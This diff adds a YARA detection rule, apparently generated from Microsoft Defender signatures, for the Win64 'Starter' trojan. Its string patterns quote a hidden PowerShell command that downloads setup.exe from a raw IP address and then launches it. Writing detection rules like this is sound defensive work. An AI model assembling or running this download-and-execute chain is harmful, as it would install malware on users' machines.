@@ -65,3 +65,26 @@ rule Trojan_Win64_Starter_MK_2147967547_0
         (all of ($x*))
 }
 
+rule Trojan_Win64_Starter_MKA_2147968295_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win64/Starter.MKA!MTB"
+        threat_id = "2147968295"
+        type = "Trojan"
+        platform = "Win64: Windows 64-bit platform"
+        family = "Starter"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
+        threshold = "35"
+        strings_accuracy = "High"
+    strings:
+        $x_20_1 = "exist \"C:\\test\\setup.exe\" start \"\" \"C:\\test\\setup.exe\" /azdidse=757681" ascii //weight: 20
+        $x_10_2 = "try{$wc.DownloadFile('http://194.87.138.68/setup.exe','C:\\test\\setup.exe')}" ascii //weight: 10
+        $x_5_3 = "powershell -WindowStyle Hidden -Command \"$wc=New-Object Net.WebClient;" ascii //weight: 5
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
